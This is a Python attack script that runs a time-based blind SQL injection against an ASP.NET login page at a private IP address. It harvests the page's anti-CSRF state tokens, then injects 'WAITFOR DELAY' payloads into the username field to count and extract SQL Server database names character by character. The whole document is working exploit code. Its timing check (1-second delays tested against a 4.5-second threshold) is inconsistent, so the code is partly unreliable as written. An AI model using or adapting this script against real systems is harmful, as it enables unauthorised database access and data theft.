import requests
import time
from bs4 import BeautifulSoup

URL = "http://192.168.215.50/login.aspx"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:151.0) Gecko/20100101 Firefox/151.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": "http://192.168.215.50",
    "Referer": "http://192.168.215.50/login.aspx"
}

def get_asp_tokens(session):
    """Fetches a fresh page load to grab valid ASP.NET anti-CSRF state tokens."""
    res = session.get(URL, headers=HEADERS)
    soup = BeautifulSoup(res.text, 'html.parser')
    
    viewstate = soup.find('input', {'id': '__VIEWSTATE'})['value']
    generator = soup.find('input', {'id': '__VIEWSTATEGENERATOR'})['value']
    validation = soup.find('input', {'id': '__EVENTVALIDATION'})['value']
    
    return viewstate, generator, validation

def test_payload(payload):
    with requests.Session() as s:
        try:
            # 1. Grab fresh tokens
            vs, vsg, ev = get_asp_tokens(s)
            
            # 2. Build the POST data exactly like your request
            data = {
                "__VIEWSTATE": vs,
                "__VIEWSTATEGENERATOR": vsg,
                "__EVENTVALIDATION": ev,
                "ctl00$ContentPlaceHolder1$UsernameTextBox": payload,
                "ctl00$ContentPlaceHolder1$PasswordTextBox": "",
                "ctl00$ContentPlaceHolder1$LoginButton": "Login"
            }
            
            start = time.time()
            s.post(URL, data=data, headers=HEADERS, timeout=10)
            elapsed = time.time() - start
            
            return elapsed >= 4.5
        except Exception as e:
            return False

print("[*] Starting enumeration of databases...")

# Step 1: Find total number of databases
num_dbs = 0
for i in range(1, 30):
    payload = f"' IF ((SELECT COUNT(name) FROM sys.databases) = {i}) WAITFOR DELAY '0:0:1'--"
    if test_payload(payload):
        num_dbs = i
        print(f"[+] Found {num_dbs} databases.")
        break

if num_dbs == 0:
    print("[-] Failed to find the database count. Verify if the application requires a live session cookie.")
    exit()

# Step 2: Extract each database name
for db_idx in range(1, num_dbs + 1):
    # Find length
    db_len = 0
    for l in range(1, 100):
        payload = f"' IF (LEN((SELECT name FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) AS rn FROM sys.databases) AS x WHERE rn = {db_idx})) = {l}) WAITFOR DELAY '0:0:1'--"
        if test_payload(payload):
            db_len = l
            break
            
    print(f"[*] Database #{db_idx} length: {db_len}. Extracting characters...")
    
    # Extract string
    db_name = ""
    for char_idx in range(1, db_len + 1):
        for ascii_val in range(32, 127):
            payload = f"' IF (ASCII(SUBSTRING((SELECT name FROM (SELECT name, ROW_NUMBER() OVER (ORDER BY name) AS rn FROM sys.databases) AS x WHERE rn = {db_idx}), {char_idx}, 1)) = {ascii_val}) WAITFOR DELAY '0:0:1'--"
            if test_payload(payload):
                db_name += chr(ascii_val)
                print(f"    Progress: {db_name}")
                break
                
    print(f"[+] Database #{db_idx}: {db_name}")
